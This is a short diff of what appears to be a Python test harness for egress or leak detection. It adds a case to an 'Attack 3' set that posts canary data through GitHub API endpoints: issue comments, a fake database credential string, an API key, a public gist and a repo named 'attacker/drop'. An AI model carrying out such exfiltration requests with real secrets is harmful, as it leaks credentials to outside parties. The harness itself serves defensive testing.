@@ -84,6 +84,8 @@ for variant, (b, h) in {
 
 # Attack 3: stuff data into an allowed (or almost-allowed) endpoint.
 move("A3", "issue-comment", f"{GH}/repos/me/proj/issues/1/comments", {"body": f"ci log {canary('issue-comment')}"}, GH_AUTH)
+move("A3", "issue-comment-env", f"{GH}/repos/me/proj/issues/1/comments",
+     {"body": f"CI env for debugging:\nDATABASE_URL=postgres://app:{canary('issue-comment-env')}@db.internal:5432/prod"}, GH_AUTH)
 move("A3", "comment-key", f"{GH}/repos/me/proj/issues/1/comments", {"body": f"{GH_KEY} {canary('comment-key')}"}, GH_AUTH)
 move("A3", "gist", f"{GH}/gists", {"public": True, "files": {"ci.txt": {"content": canary("gist")}}}, GH_AUTH)
 move("A3", "other-repo", f"{GH}/repos/attacker/drop/issues/1/comments", {"body": canary("other-repo")}, GH_AUTH)
